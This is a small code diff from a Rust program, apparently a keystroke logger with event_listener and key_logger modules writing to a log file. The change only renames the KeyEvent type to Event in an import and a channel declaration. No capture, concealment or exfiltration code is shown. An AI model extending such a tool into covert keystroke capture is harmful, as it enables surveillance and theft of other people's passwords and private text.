@@ -7,7 +7,7 @@ mod event_listener;
 mod key_logger;
 
 use crate::event_listener::event_listener;
-use crate::event_listener::KeyEvent;
+use crate::event_listener::Event;
 
 use crate::key_logger::key_logger;
 
@@ -22,7 +22,7 @@ fn main() -> std::io::Result<()> {
 
     let log_file = File::create(outputpath)?;
 
-    let (tx, rx): (Sender<KeyEvent>, Receiver<KeyEvent>) = mpsc::channel();
+    let (tx, rx): (Sender<Event>, Receiver<Event>) = mpsc::channel();
 
     let key_event_threads = event_listener(tx);
 
